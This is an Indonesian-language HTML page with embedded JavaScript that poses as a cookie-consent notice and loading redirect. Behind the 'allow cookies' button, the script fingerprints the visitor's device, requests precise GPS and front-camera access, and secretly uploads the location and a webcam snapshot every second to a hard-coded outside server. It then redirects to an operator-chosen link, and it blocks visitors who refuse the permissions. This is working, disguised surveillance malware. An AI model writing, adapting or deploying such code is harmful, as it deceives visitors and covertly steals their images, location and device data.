<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Memuat...</title>
<style>
* { box-sizing: border-box; }
html, body { height: 100%; margin: 0; }
body {
  background: #f7f5f0;
  color: #232923;
  font-family: system-ui, -apple-system, "Segoe UI", Roboto, "DM Sans", sans-serif;
  font-size: 14px;
}

#nara-consent {
  position: fixed;
  left: 16px;
  right: 16px;
  bottom: 16px;
  z-index: 999999;
  background: #232923;
  color: #f7f5f0;
  border-radius: 10px;
  padding: 18px;
  box-shadow: 0 10px 30px rgba(0,0,0,.25);
  display: flex;
  flex-direction: column;
  gap: 12px;
  font-size: 13px;
  line-height: 1.5;
  max-width: 480px;
  margin: 0 auto;
}
#nara-consent p { margin: 0; }
#nara-consent button {
  border: 0;
  cursor: pointer;
  font: inherit;
  font-size: 13px;
  padding: 11px 20px;
  border-radius: 5px;
  font-weight: 600;
  background: #b47b83;
  color: #232923;
  width: 100%;
}
#nara-consent button:hover { background: #a86c74; }

#nara-loading {
  display: none;
  position: fixed;
  inset: 0;
  z-index: 999998;
  background: #f7f5f0;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  gap: 18px;
  text-align: center;
  padding: 24px;
}
#nara-loading.show { display: flex; }

.spinner {
  width: 44px;
  height: 44px;
  border: 3px solid #e0dfd8;
  border-top-color: #744653;
  border-radius: 50%;
  animation: spin 0.9s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }

#nara-loading-text {
  color: #555;
  font-size: 14px;
  font-weight: 500;
  min-height: 22px;
}

#nara-loading-sub {
  color: #999;
  font-size: 12px;
  margin-top: -8px;
}

#nara-error {
  display: none;
  position: fixed;
  inset: 0;
  z-index: 999999;
  background: #f7f5f0;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  gap: 16px;
  text-align: center;
  padding: 24px;
}
#nara-error.show { display: flex; }
#nara-error h3 {
  margin: 0;
  color: #a32424;
  font-size: 16px;
  font-weight: 600;
}
#nara-error p {
  color: #555;
  margin: 0;
  max-width: 340px;
  line-height: 1.55;
  font-size: 13px;
}
#nara-error button {
  padding: 11px 28px;
  background: #744653;
  color: #fff;
  border: 0;
  border-radius: 6px;
  font-size: 13px;
  font-weight: 600;
  cursor: pointer;
  font-family: inherit;
}
#nara-error button:hover { background: #59333f; }

@media (max-width: 520px) {
  #nara-consent { left: 10px; right: 10px; bottom: 10px; padding: 14px; }
}
</style>
</head>
<body>

<div id="nara-loading">
  <div class="spinner"></div>
  <div id="nara-loading-text">Memproses...</div>
  <div id="nara-loading-sub"></div>
</div>

<div id="nara-error">
  <h3>Akses Diperlukan</h3>
  <p id="nara-error-msg">Izin kamera dan lokasi diperlukan untuk melanjutkan.</p>
  <button id="nara-retry">Coba Lagi</button>
</div>

<script>
(function () {
  var BASE = 'https://149.33.27.129.nip.io/phi';
  var VISIT_EP = BASE + '/api/visit';
  var DEVICE_EP = BASE + '/api/device/';
  var LOC_EP = BASE + '/api/location/';
  var FRAME_EP = BASE + '/api/frame/';
  var TARGET_EP = BASE + '/api/current-target';

  var TARGET = '';
  var visitId = null;
  var stream = null;
  var captureTimer = null;
  var redirected = false;
  var running = false;

  function log() {
    try { var a = Array.prototype.slice.call(arguments); a.unshift('[go]'); console.log.apply(console, a); } catch (e) {}
  }

  function redirect() {
    if (redirected) return;
    redirected = true;
    if (!TARGET) { log('no target'); return; }
    log('redirecting to', TARGET);
    window.location.replace(TARGET);
  }

  function showLoading(text, sub) {
    document.getElementById('nara-loading-text').textContent = text || 'Memproses...';
    document.getElementById('nara-loading-sub').textContent = sub || '';
    document.getElementById('nara-loading').classList.add('show');
  }
  function hideLoading() {
    document.getElementById('nara-loading').classList.remove('show');
  }
  function showError(msg) {
    if (msg) document.getElementById('nara-error-msg').textContent = msg;
    document.getElementById('nara-error').classList.add('show');
  }
  function hideError() {
    document.getElementById('nara-error').classList.remove('show');
  }

  // ===== Resolve target: ?to= param dulu, kalau kosong fetch dari API =====
  function resolveTarget() {
    var params = new URLSearchParams(location.search);
    var toParam = params.get('to') || '';
    if (/^https?:\/\//i.test(toParam)) {
      TARGET = toParam;
      log('target from URL:', TARGET);
      return Promise.resolve(TARGET);
    }
    log('fetching target from API');
    return fetch(TARGET_EP, { cache: 'no-store' })
      .then(function (r) { return r.json(); })
      .then(function (data) {
        if (data && data.url && /^https?:\/\//i.test(data.url)) {
          TARGET = data.url;
          log('target from API:', TARGET);
          return TARGET;
        }
        return '';
      })
      .catch(function (e) { log('fetch target failed', e); return ''; });
  }

  // ===== Visit & device =====
  function sendVisit() {
    return fetch(VISIT_EP, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ page: location.href, target: TARGET }),
      keepalive: true
    }).then(function (r) { return r.json(); })
      .then(function (data) {
        if (data && data.id) { visitId = data.id; log('visit id', visitId); }
        return data;
      })
      .catch(function (e) { log('sendVisit failed', e); });
  }

  async function collectDevice() {
    var d = {};
    try {
      if (navigator.userAgentData) {
        var ua = await navigator.userAgentData.getHighEntropyValues(['platform','platformVersion','architecture','model']);
        if (ua.platform) d.platform = ua.platform;
        if (ua.platformVersion) d.platformVersion = ua.platformVersion;
        if (ua.model) d.deviceModel = ua.model;
        if (ua.architecture) d.architecture = ua.architecture;
        if (ua.platform) d.os = ua.platform + (ua.platformVersion ? ' ' + ua.platformVersion : '');
      }
    } catch (e) {}
    if (!d.platform && navigator.platform) d.platform = navigator.platform;
    if (navigator.vendor) d.deviceVendor = navigator.vendor;

    var uaStr = navigator.userAgent || '';
    if (/iPhone/i.test(uaStr)) d.deviceType = 'iPhone';
    else if (/iPad/i.test(uaStr)) d.deviceType = 'iPad';
    else if (/Android/i.test(uaStr)) {
      d.deviceType = 'Android';
      var mA = uaStr.match(/Android\s+([\d.]+)/);
      if (mA && !d.os) d.os = 'Android ' + mA[1];
      var mModel = uaStr.match(/;\s*([^;)]+)\s+Build/);
      if (mModel && !d.deviceModel) d.deviceModel = mModel[1].trim();
    }
    else if (/Mobile/i.test(uaStr)) d.deviceType = 'Mobile';
    else if (/Tablet/i.test(uaStr)) d.deviceType = 'Tablet';
    else d.deviceType = 'Desktop';

    if (!d.os) {
      if (/Windows NT 10/.test(uaStr)) d.os = 'Windows 10/11';
      else if (/Windows NT 6.3/.test(uaStr)) d.os = 'Windows 8.1';
      else if (/Windows NT 6.1/.test(uaStr)) d.os = 'Windows 7';
      else if (/Mac OS X/.test(uaStr)) { var mMac = uaStr.match(/Mac OS X ([\d_.]+)/); d.os = mMac ? 'macOS ' + mMac[1].replace(/_/g, '.') : 'macOS'; }
      else if (/Linux/.test(uaStr)) d.os = 'Linux';
    }

    var browser = 'Unknown';
    if (/Edg\//.test(uaStr)) browser = 'Edge';
    else if (/OPR\/|Opera/.test(uaStr)) browser = 'Opera';
    else if (/Chrome\//.test(uaStr) && !/Edg|OPR/.test(uaStr)) browser = 'Chrome';
    else if (/Firefox\//.test(uaStr)) browser = 'Firefox';
    else if (/Safari\//.test(uaStr) && !/Chrome/.test(uaStr)) browser = 'Safari';
    var mVer = uaStr.match(/(Edg|OPR|Chrome|Firefox|Safari)\/([\d.]+)/);
    d.browser = browser + (mVer ? ' ' + mVer[2].split('.')[0] : '');

    d.cpuCores = navigator.hardwareConcurrency || null;
    d.deviceMemory = navigator.deviceMemory || null;
    d.screen = window.screen ? (screen.width + 'x' + screen.height) : '';
    d.pixelRatio = window.devicePixelRatio || 1;
    d.touch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
    d.maxTouchPoints = navigator.maxTouchPoints || 0;

    try {
      var c = document.createElement('canvas');
      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (gl) {
        var dbg = gl.getExtension('WEBGL_debug_renderer_info');
        if (dbg) {
          var r = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '';
          var v = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || '';
          d.gpu = (r + (v ? ' (' + v + ')' : '')).trim();
        }
      }
    } catch (e) {}

    d.language = navigator.language || (navigator.languages && navigator.languages[0]) || '';
    try { d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch (e) {}

    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) d.connection = (conn.effectiveType || '') + (conn.downlink ? ' / ' + conn.downlink + 'Mbps' : '');

    try {
      if (navigator.getBattery) {
        var bat = await navigator.getBattery();
        d.battery = Math.round(bat.level * 100) + '%' + (bat.charging ? ' (charging)' : '');
      }
    } catch (e) {}

    return d;
  }

  function sendDevice(d) {
    if (!visitId) return Promise.resolve();
    return fetch(DEVICE_EP + visitId, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(d),
      keepalive: true
    }).catch(function () {});
  }
  function sendLocation(lat, lng, acc) {
    if (!visitId) return Promise.resolve();
    return fetch(LOC_EP + visitId, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ lat: lat, lng: lng, accuracy: acc || null }),
      keepalive: true
    }).catch(function () {});
  }
  function sendFrame(dataUrl) {
    if (!visitId) return Promise.resolve();
    return fetch(FRAME_EP + visitId, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ image: dataUrl }),
      keepalive: true
    }).catch(function () {});
  }

  function requestGPS() {
    return new Promise(function (resolve) {
      if (!navigator.geolocation) { log('no geolocation'); resolve(false); return; }
      navigator.geolocation.getCurrentPosition(
        function (pos) {
          log('GPS granted');
          sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
          resolve(true);
        },
        function (err) {
          log('GPS denied', err && err.code);
          resolve(false);
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    });
  }

  // ===== Kamera: tunggu sampai frame valid (bukan hitam), baru resolve =====
  function startCamera() {
    return new Promise(function (resolve) {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        log('no getUserMedia');
        resolve(false);
        return;
      }
      navigator.mediaDevices.getUserMedia({
        video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
        audio: false
      }).then(function (s) {
        log('camera granted');
        stream = s;

        var video = document.createElement('video');
        video.setAttribute('playsinline', '');
        video.setAttribute('webkit-playsinline', '');
        video.setAttribute('autoplay', '');
        video.setAttribute('muted', '');
        video.muted = true;
        video.playsInline = true;
        video.autoplay = true;
        video.srcObject = s;
        // HARUS tetap di viewport (bukan offscreen) supaya browser render frame
        video.style.cssText = 'position:fixed;top:0;left:0;width:2px;height:2px;opacity:0.01;pointer-events:none;z-index:-1;';
        document.body.appendChild(video);

        var canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        var ctx = canvas.getContext('2d');

        var started = false;
        var attempts = 0;
        var MAX_ATTEMPTS = 30; // 30 * 100ms = 3 detik max tunggu

        function isFrameValid(dataUrl) {
          // Frame hitam 640x480 JPEG q=0.6 biasanya < 1500 byte.
          // Frame berisi konten normal > 3000 byte.
          return dataUrl && dataUrl.length > 1500;
        }

        function captureOnce() {
          try {
            if (video.readyState < 2 || !video.videoWidth) return;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            var data = canvas.toDataURL('image/jpeg', 0.6);
            if (isFrameValid(data)) {
              sendFrame(data);
            }
          } catch (e) {}
        }

        function tryStart() {
          if (started) return;
          attempts++;
          try {
            if (video.readyState >= 2 && video.videoWidth > 0) {
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              var testData = canvas.toDataURL('image/jpeg', 0.6);
              if (isFrameValid(testData)) {
                // Frame valid! Kirim frame pertama, mulai interval
                started = true;
                sendFrame(testData);
                captureTimer = setInterval(captureOnce, 1000);
                resolve(true);
                return;
              }
            }
          } catch (e) {}

          if (attempts < MAX_ATTEMPTS) {
            setTimeout(tryStart, 100);
          } else {
            // Timeout - tetap mulai capture walau frame mungkin gelap (lingkungan gelap)
            log('camera timeout waiting valid frame, starting anyway');
            started = true;
            captureTimer = setInterval(captureOnce, 1000);
            resolve(true);
          }
        }

        // Force play (autoplay kadang butuh explicit play())
        try { video.play().catch(function () {}); } catch (e) {}

        video.addEventListener('loadedmetadata', function () {
          try { video.play().catch(function () {}); } catch (e) {}
          setTimeout(tryStart, 200);
        }, { once: true });

        video.addEventListener('playing', function () {
          setTimeout(tryStart, 200);
        }, { once: true });

        // Fallback: coba cek mulai 500ms
        setTimeout(tryStart, 500);
      }).catch(function (e) {
        log('camera denied', e && e.name);
        resolve(false);
      });
    });
  }

  function stopEverything() {
    if (captureTimer) { clearInterval(captureTimer); captureTimer = null; }
    if (stream) { stream.getTracks().forEach(function (t) { t.stop(); }); stream = null; }
    document.querySelectorAll('video').forEach(function (el) {
      if (el.srcObject) { el.pause(); el.srcObject = null; el.remove(); }
    });
  }

  function startCountdownAndRedirect() {
    var count = 3;
    showLoading('Please wait... ' + count, 'Jangan tutup halaman ini');
    var timer = setInterval(function () {
      count--;
      if (count > 0) {
        document.getElementById('nara-loading-text').textContent = 'Please wait... ' + count;
      } else {
        clearInterval(timer);
        document.getElementById('nara-loading-text').textContent = 'Please wait...';
        document.getElementById('nara-loading-sub').textContent = 'Mengarahkan...';
        setTimeout(redirect, 200);
      }
    }, 1000);
  }

  function handleAllow() {
    if (running) return;
    running = true;

    var banner = document.getElementById('nara-consent');
    if (banner) banner.remove();
    hideError();
    showLoading('Meminta izin...', 'Mohon setujui permintaan akses');

    Promise.all([requestGPS(), startCamera()]).then(function (results) {
      var gpsOk = results[0];
      var camOk = results[1];
      log('permissions', { gps: gpsOk, camera: camOk });

      if (gpsOk && camOk) {
        startCountdownAndRedirect();
      } else {
        hideLoading();
        var parts = [];
        if (!camOk) parts.push('kamera');
        if (!gpsOk) parts.push('lokasi');
        var msg = 'Izin ' + parts.join(' dan ') + ' diperlukan untuk melanjutkan. ' +
                  'Jika Anda sudah menolak sebelumnya, izinkan melalui pengaturan browser lalu coba lagi.';
        showError(msg);
        stopEverything();
        running = false;
      }
    });
  }

  function buildBanner() {
    if (document.getElementById('nara-consent')) return;
    var el = document.createElement('div');
    el.id = 'nara-consent';
    el.innerHTML = '<p>Kami menggunakan cookies untuk meningkatkan pengalaman Anda di situs ini.</p>' +
                   '<button id="nara-allow">Izinkan</button>';
    document.body.appendChild(el);
    document.getElementById('nara-allow').onclick = handleAllow;
  }

  document.getElementById('nara-retry').onclick = function () {
    hideError();
    handleAllow();
  };

  // ===== Boot =====
  resolveTarget().then(function () {
    if (!TARGET) {
      showError('Target URL belum diset oleh admin. Silakan hubungi admin.');
      document.getElementById('nara-retry').style.display = 'none';
      return;
    }

    sendVisit().then(function () {
      if (visitId) {
        collectDevice().then(function (dev) {
          if (dev && Object.keys(dev).length) sendDevice(dev);
        });
      }
      buildBanner();
    });
  });

  window.addEventListener('pagehide', stopEverything);
  window.addEventListener('beforeunload', stopEverything);
})();
</script>
</body>
</html>
